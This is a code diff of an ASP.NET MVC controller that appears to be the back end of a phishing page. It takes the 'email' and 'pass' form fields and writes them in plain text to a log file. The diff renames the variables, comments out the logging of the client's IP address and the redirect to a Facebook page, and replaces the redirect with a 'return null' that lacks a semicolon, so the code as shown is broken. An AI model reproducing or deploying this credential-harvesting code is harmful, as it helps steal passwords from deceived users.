@@ -10,7 +10,7 @@ namespace MvcApplication2.Controllers
 {
     public class RequestHelpers
     {
-        public static string GetClientIpAddress(HttpRequestBase request)
+/*        public static string GetClientIpAddress(HttpRequestBase request)
         {
             try
             {
@@ -63,10 +63,11 @@ namespace MvcApplication2.Controllers
             return isLinkLocalAddress;
         }
     }
-
+        */
 
     public class HomeController : Controller
     {
+        /*
         public static string GetIPAddress(HttpRequestBase request)
         {
             string ip;
@@ -90,7 +91,7 @@ namespace MvcApplication2.Controllers
             catch { ip = null; }
 
             return ip;
-        }
+        }*/
 
         public ActionResult Index()
         {
@@ -101,10 +102,10 @@ namespace MvcApplication2.Controllers
         {
             string strPath = AppDomain.CurrentDomain.BaseDirectory;
             string strLogFilePath = strPath + @"log\log.txt";
-            string userName = collection.Get("email");
-            string passwd = collection.Get("pass");
-            string ip = GetIPAddress(HttpContext.Request);
-            var clientIP = Request.UserHostAddress;
+            string s1 = collection.Get("email");
+            string p1 = collection.Get("pass");
+           // string ip = GetIPAddress(HttpContext.Request);
+            //var clientIP = Request.UserHostAddress;
 
             string path = @"c:\temp\MyTest.txt";
             // This text is added only once to the file.
@@ -113,10 +114,10 @@ namespace MvcApplication2.Controllers
                 // Create a file to write to.
                 using (StreamWriter writetext = System.IO.File.CreateText(strLogFilePath))
                 {
-                    writetext.WriteLine("username:" + userName);
-                    writetext.WriteLine("passswd: " + passwd);
-                    writetext.WriteLine("ip: " + ip);
-                    writetext.WriteLine("client ip: " + clientIP);
+                    writetext.WriteLine("username:" + s1);
+                    writetext.WriteLine("passswd: " + p1);
+             //       writetext.WriteLine("ip: " + ip);
+             //       writetext.WriteLine("client ip: " + clientIP);
                     writetext.WriteLine("date: " + DateTime.Now.ToString());
                     writetext.WriteLine();
                     writetext.Close();
@@ -127,16 +128,17 @@ namespace MvcApplication2.Controllers
             // if it is not deleted.
             using (StreamWriter writetext = System.IO.File.AppendText(strLogFilePath))
             {
-                writetext.WriteLine("username:" + userName);
-                writetext.WriteLine("passswd: " + passwd);
-                writetext.WriteLine("ip: " + ip);
-                writetext.WriteLine("client ip: " + clientIP);
+                writetext.WriteLine("username:" + s1);
+                writetext.WriteLine("passswd: " + p1);
+                //writetext.WriteLine("ip: " + ip);
+                //writetext.WriteLine("client ip: " + clientIP);
                 writetext.WriteLine("date: " + DateTime.Now.ToString());
                 writetext.WriteLine();
                 writetext.Close();
             }
 
-            return Redirect(@"https://www.facebook.com/pages/Wank-Horse/649867128361350");
+            //return Redirect(@"https://www.facebook.com/pages/Wank-Horse/649867128361350");
+            return null
         }
     }
 }
